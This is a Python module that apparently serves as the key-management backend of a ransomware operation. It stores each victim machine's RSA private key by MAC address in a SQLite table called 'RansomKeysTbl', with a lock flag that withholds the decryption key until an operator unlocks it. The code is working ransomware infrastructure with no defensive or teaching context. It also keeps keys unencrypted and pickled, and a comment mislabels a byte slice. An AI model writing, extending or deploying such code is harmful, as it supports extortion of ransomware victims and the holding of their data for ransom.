import sqlite3
import os
from cryptography.hazmat.primitives import serialization
import pickle
from cryptography.hazmat.primitives.asymmetric import rsa


class db:
    def __init__(self, dbFileName=None):
        self.table_name = "RansomKeysTbl"

        if not dbFileName:
            dbFileName = "RansomKeys.db"
        
        script_path = os.path.dirname(os.path.abspath(__file__))
        self.dbPath = os.path.join(script_path, dbFileName)
        if not os.path.isfile(self.dbPath): #create new DB
            self.__create_db()

        self.conn = sqlite3.connect(self.dbPath, check_same_thread=False) 
        self.cursor = self.conn.cursor()


    def __create_db(self):
        conn = sqlite3.connect(self.dbPath) 
        cursor = conn.cursor()
        
        query = f"CREATE TABLE IF NOT EXISTS {self.table_name} (mac TEXT PRIMARY KEY, rsa_key BLOB NOT NULL, locked BOOLEAN)"
        cursor.execute(query)

        conn.commit()
        conn.close()
    

    def __str__(self):
        self.cursor.execute(f"SELECT * FROM {self.table_name}")
        rows = self.cursor.fetchall()
        obj_str = ""
        for row in rows:
            mac = row[0]
            rsa_key_blob = row[1]
            # Unpickle and deserialize to get PEM bytes
            pem_bytes = pickle.loads(rsa_key_blob)
            obj_str += f"MAC: {mac}, Locked: {row[2]},RSA Key PEM (first 60 bytes): {pem_bytes[100:200]}...\n"

        return obj_str.strip()


    def add(self, mac, rsa_key):
        pem_bytes = rsa_key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8,encryption_algorithm=serialization.NoEncryption())
        pem_dump = pickle.dumps(pem_bytes)

        query = f"INSERT OR REPLACE INTO {self.table_name} (mac, rsa_key, locked) VALUES (?, ?, ?)"
        self.cursor.execute(query, (mac, pem_dump, True))
        self.conn.commit()


    def clear(self):
        query = f"DELETE FROM {self.table_name}"
        self.cursor.execute(query)
        self.conn.commit()


    def delete(self, mac):
        query = f"DELETE FROM {self.table_name} WHERE mac = ?"
        self.cursor.execute(query, (mac,))
        self.conn.commit()


    def get_private_key(self, mac):
        query = f"SELECT rsa_key FROM {self.table_name} WHERE mac = ? AND locked = ?"
        self.cursor.execute(query, (mac, 0))
        row = self.cursor.fetchone()
        if row is None:
            return None  # No key found for this MAC

        pem_dump = row[0]
        pem_bytes = pickle.loads(pem_dump)

        private_key = serialization.load_pem_private_key(pem_bytes, password=None)
        return private_key


    def unlock(self, mac):
        query = f"UPDATE {self.table_name} SET locked = 0 WHERE mac = ?"
        self.cursor.execute(query, (mac,))
        self.conn.commit()

    
    def lock(self, mac):
        query = f"UPDATE {self.table_name} SET locked = 1 WHERE mac = ?"
        self.cursor.execute(query, (mac,))
        self.conn.commit()


if __name__ == "__main__":
    x = db()
    x.unlock("mac here")
    print(x)
    